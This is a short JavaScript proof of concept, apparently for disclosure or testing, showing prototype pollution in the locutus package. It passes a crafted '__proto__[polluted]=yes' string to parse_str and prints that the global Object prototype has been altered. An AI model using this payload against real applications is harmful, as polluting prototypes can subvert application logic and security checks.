var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const locutus = require('locutus');
locutus.php.strings.parse_str('__proto__[polluted]=yes');
console.log({}.polluted);